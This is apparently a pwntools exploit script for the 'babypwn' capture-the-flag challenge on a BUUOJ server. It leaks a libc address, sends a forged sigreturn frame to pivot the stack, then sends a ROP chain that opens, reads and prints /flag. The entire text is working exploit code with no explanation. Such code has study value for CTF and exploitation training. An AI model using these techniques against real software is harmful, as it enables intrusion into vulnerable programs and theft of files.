from pwn import *
p = process("./babypwn")
p = remote('node3.buuoj.cn',29429)
libc=ELF("libc-2.23.so")
p.recvuntil("Here is my gift: ")
puts_addr = int(p.recvuntil('\n',drop=True),16)
libc.address = puts_addr - libc.sym['puts']
p.recvuntil('Please input magic message: ')
fake_frame  = p64(0) * 12
fake_frame += p64(0)                                       # RDI = RAX
fake_frame += p64(0)                                       # RSI = RDI
fake_frame += p64(0)                                       # RBP
fake_frame += p64(0)                                       # RBX
fake_frame += p64(libc.address + 0x3C6500 - 0x10)          # RDX = RSI
fake_frame += p64(0)                                       # RAX
fake_frame += p64(0x100)                                   # RCX = RDX
fake_frame += p64(libc.address + 0x3C6500)                 # RSP
fake_frame += p64(libc.symbols['syscall'])                 # RIP
fake_frame += p64(0)                                       # eflags
fake_frame += p64(0x33)                                    # cs : gs : fs
fake_frame += p64(0) * 7
p.send(fake_frame)
ROP_chain  = '/flag\x00\x00\x00'
ROP_chain += p64(0)
ROP_chain += p64(libc.address + 0x0000000000021102)
ROP_chain += p64(libc.address + 0x3C6500 - 0x10)
ROP_chain += p64(libc.address + 0x00000000000202E8)
ROP_chain += p64(0)
ROP_chain += p64(libc.symbols['open'])
ROP_chain += p64(libc.address + 0x0000000000021102)
ROP_chain += p64(3)
ROP_chain += p64(libc.address + 0x00000000000202E8)
ROP_chain += p64(libc.address + 0x3C6700)
ROP_chain += p64(libc.address + 0x0000000000001B92)
ROP_chain += p64(0x100)
ROP_chain += p64(libc.symbols['read'])
ROP_chain += p64(libc.address + 0x0000000000021102)
ROP_chain += p64(1)
ROP_chain += p64(libc.address + 0x00000000000202E8)
ROP_chain += p64(libc.address + 0x3C6700)
ROP_chain += p64(libc.address + 0x0000000000001B92)
ROP_chain += p64(0x100)
ROP_chain += p64(libc.symbols['write'])
raw_input('>')
p.send(ROP_chain)
p.interactive()
